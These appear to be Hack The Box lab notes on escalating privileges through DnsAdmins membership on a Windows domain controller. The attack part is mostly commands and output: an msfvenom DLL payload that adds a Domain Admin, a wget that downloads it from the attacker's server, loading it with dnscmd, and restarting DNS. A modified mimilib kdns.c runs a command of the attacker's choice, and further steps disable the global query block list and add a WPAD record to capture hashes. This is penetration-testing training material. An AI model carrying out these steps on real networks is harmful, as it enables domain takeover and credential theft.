# DNS admins

Members of the [DnsAdmins](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#dnsadmins)
 group have access to DNS information on the network. The Windows DNS 
service supports custom plugins and can call functions from them to 
resolve name queries that are not in the scope of any locally hosted DNS
 zones. The DNS service runs as `NT AUTHORITY\SYSTEM`, so 
membership in this group could potentially be leveraged to escalate 
privileges on a Domain Controller or in a situation where a separate 
server is acting as the DNS server for the domain. It is possible to use
 the built-in [dnscmd](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd) utility to specify the path of the plugin DLL. As detailed in this excellent [post](https://adsecurity.org/?p=4064), the following attack can be performed when DNS is run on a Domain Controller (which is very common):

- DNS management is performed over RPC
- [ServerLevelPluginDll](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/c9d38538-8827-44e6-aa5e-022a016ed723) allows us to load a custom DLL with zero verification of the DLL's path. This can be done with the `dnscmd` tool from the command line
- When a member of the `DnsAdmins` group runs the `dnscmd` command below, the `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll` registry key is populated
- When the DNS service is restarted, the DLL in this path will be
loaded (i.e., a network share that the Domain Controller's machine
account can access)
- An attacker can load a custom DLL to obtain a reverse shell or even load a tool such as Mimikatz as a DLL to dump credentials.

# Leveraging attack

**generating malicious DLL**

```
doshim@htb[/htb]$ msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 313 bytes
Final size of dll file: 5120 bytes
Saved as: adduser.dll
```

**start local server**

```
doshim@htb[/htb]$ python3 -m http.server 7777Serving HTTP on 0.0.0.0 port 7777 (http://0.0.0.0:7777/) ...
```

**Download file on target**
`PS C:\htb>  wget "http://10.10.14.3:7777/adduser.dll" -outfile "adduser.dll"`

**Loading DLL as Non-Privileged User**

```
C:\htb> dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll

DNS Server failed to reset registry property.
    Status = 5 (0x00000005)
Command failed: ERROR_ACCESS_DENIED
```

***As expected, attempting to execute this command as a normal user isn't successful. Only members of the `DnsAdmins` group are permitted to do this***.

**Loading DLL as Member of DnsAdmins**

```powershell
C:\htb> Get-ADGroupMember -Identity DnsAdmins

distinguishedName : CN=netadm,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
name              : netadm
objectClass       : user
objectGUID        : 1a1ac159-f364-4805-a4bb-7153051a8c14
SamAccountName    : netadm
SID               : S-1-5-21-669053619-2741956077-1013132368-1109
```

**Loading Custom DLL**

```
C:\htb> dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll

Registry property serverlevelplugindll successfully reset.
Command completed successfully.
```

**After restarting the DNS service (if our user has this level of access), we should be able to run our custom DLL and add a user (in our case) or get a reverse shell. If we do not have access to restart the DNS server, we will have to wait until the server or service restarts. Let's check our current user's permissions on the DNS service.**

**Finding User's SID**

```
C:\htb> wmic useraccount where name="netadm" get sid

SID
S-1-5-21-669053619-2741956077-1013132368-1109
```

### Checking Permissions on DNS Service

Once we have the user's SID, we can use the `sc` command to check permissions on the service. Per this [article](https://www.winhelponline.com/blog/view-edit-service-permissions-windows/), we can see that our user has `RPWP` permissions which translate to `SERVICE_START` and `SERVICE_STOP`, respectively.

```
C:\htb> sc.exe sdshow DNS

D:(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)
```

**starting and stopping dns service**

```
C:\htb> sc stop dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
```

```
C:\htb> sc start dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
```

### Confirming Group Membership

If all goes to plan, our account will be added to the Domain Admins 
group or receive a reverse shell if our custom DLL was made to give us a
 connection back.

```
C:\htb> net group "Domain Admins" /dom

Group name     Domain Admins
Comment        Designated administrators of the domain

Members

-------------------------------------------------------------------------------
Administrator            netadm
```

## Using Mimilib.dll

As detailed in this [post](http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html), we could also utilize [mimilib.dll](https://github.com/gentilkiwi/mimikatz/tree/master/mimilib) from the creator of the `Mimikatz` tool to gain command execution by modifying the [kdns.c](https://github.com/gentilkiwi/mimikatz/blob/master/mimilib/kdns.c) file to execute a reverse shell one-liner or another command of our choosing.

Code: c

```c

	return ERROR_SUCCESS;
}

	if(kdns_logfile = _wfopen(L"kiwidns.log", L"a"))
#pragma warning(pop)
	{
		klog(kdns_logfile, L"%S (%hu)\n", pszQueryName, wQueryType);
		fclose(kdns_logfile);
	    system("ENTER COMMAND HERE");
	}
	return ERROR_SUCCESS;
}

```

## Creating a WPAD Record

Another way to abuse DnsAdmins group privileges is by creating a WPAD record. Membership in this group gives us the rights to [disable global query block security](https://docs.microsoft.com/en-us/powershell/module/dnsserver/set-dnsserverglobalqueryblocklist?view=windowsserver2019-ps),
 which by default blocks this attack. Server 2008 first introduced the 
ability to add to a global query block list on a DNS server. By default,
 Web Proxy Automatic Discovery Protocol (WPAD) and Intra-site Automatic 
Tunnel Addressing Protocol (ISATAP) are on the global query block list. 
These protocols are quite vulnerable to hijacking, and any domain user 
can create a computer object or DNS record containing those names.

After disabling the global query block list and creating a WPAD 
record, every machine running WPAD with default settings will have its 
traffic proxied through our attack machine. We could use a tool such as [Responder](https://github.com/lgandx/Responder) or [Inveigh](https://github.com/Kevin-Robertson/Inveigh) to perform traffic spoofing, and attempt to capture password hashes and crack them offline or perform an SMBRelay attack.

### Disabling the Global Query Block List

To set up this attack, we first disabled the global query block list:

DnsAdmins

```powershell
C:\htb> Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
```

### Adding a WPAD Record

Next, we add a WPAD record pointing to our attack machine.

DnsAdmins

```powershell
C:\htb> Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.
```
